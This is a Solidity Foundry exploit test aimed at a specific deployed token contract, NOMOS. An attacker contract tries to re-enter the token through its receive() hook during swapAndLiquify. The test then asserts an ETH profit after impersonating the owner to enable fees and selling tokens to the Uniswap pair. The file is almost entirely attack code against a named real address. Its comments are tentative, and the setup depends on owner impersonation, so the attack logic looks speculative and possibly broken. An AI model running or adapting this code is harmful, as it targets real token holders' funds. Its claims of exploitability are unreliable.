pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface INOMOS {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function swapAndLiquifyEnabled() external view returns (bool);
    function uniswapV2Pair() external view returns (address);
    function owner() external view returns (address);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function afterPreSale() external;
    function _transfer(address from, address to, uint256 amount) external;
    function swapAndLiquify(uint256 contractTokenBalance) external;
}

interface IUniswapV2Pair {
    function sync() external;
}

contract AttackContract {
    INOMOS public token;
    bool private attacking = false;
    uint256 private reentrancyCount = 0;

    constructor(address _token) {
        token = INOMOS(_token);
    }

    function sellTokens(address pair, uint256 amount) public {
        token.transfer(pair, amount);
    }

    function triggerExploit() public {
        // This function would be called when we want to trigger the exploit
        // We need to be in a state where swapAndLiquify will be called

        // For now, just try to transfer to pair to generate fees
        address pair = token.uniswapV2Pair();
        token.transfer(pair, token.balanceOf(address(this)));
    }

    // This is the key - if we receive ETH during addLiquidityETH, we can re-enter
    receive() external payable {
        if (!attacking && msg.value > 0) {
            attacking = true;
            reentrancyCount++;

            // Try to re-enter by transferring tokens
            address pair = token.uniswapV2Pair();

            // Transfer a small amount to trigger _transfer
            // This might call swapAndLiquify if conditions are met
            token.transfer(pair, 1000);

            attacking = false;
        }
    }

    // Fallback function
    fallback() external payable {}
}

// Interface for the specific contract at address TARGET
interface NOMOS_0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc {
    function owner() external view returns (address);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function afterPreSale() external;
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function uniswapV2Pair() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;
    address attacker = address(this);
    AttackContract private attackContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address
        address owner = NOMOS_0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc(TARGET).owner();

        // Impersonate owner to configure contract
        vm.startPrank(owner);
        NOMOS_0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc(TARGET).setSwapAndLiquifyEnabled(true);
        NOMOS_0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc(TARGET).afterPreSale(); // Enable fees
        vm.stopPrank();

        // Give attacker some NOMOS tokens
        deal(TARGET, attacker, 50000000 * 10**11); // 50M tokens with 11 decimals

        // Approve the test contract to spend attacker's tokens
        vm.prank(attacker);
        NOMOS_0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc(TARGET).approve(address(this), type(uint256).max);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Deploy attack contract
        attackContract = new AttackContract(TARGET);

        // Fund attack contract with NOMOS tokens
        vm.prank(attacker);
        NOMOS_0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc(TARGET).transfer(address(attackContract), 30000000 * 10**11);

        // Get the pair address
        address pair = NOMOS_0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc(TARGET).uniswapV2Pair();

        // First, we need to accumulate fees in the NOMOS contract
        // The contract needs to have token balance >= minimumTokensBeforeSwap (20M tokens)
        // We can do this by selling tokens to the pair
        // But we need to make sure swapAndLiquifyEnabled is true

        // Let's check if contract has accumulated fees
        uint256 contractBalance = NOMOS_0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc(TARGET).balanceOf(TARGET);
        console.log("Contract token balance:", contractBalance);

        // If not enough, we need to generate fees by trading
        // Sell some tokens to generate fees
        attackContract.sellTokens(pair, 10000000 * 10**11);

        // Now trigger the exploit
        attackContract.triggerExploit();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

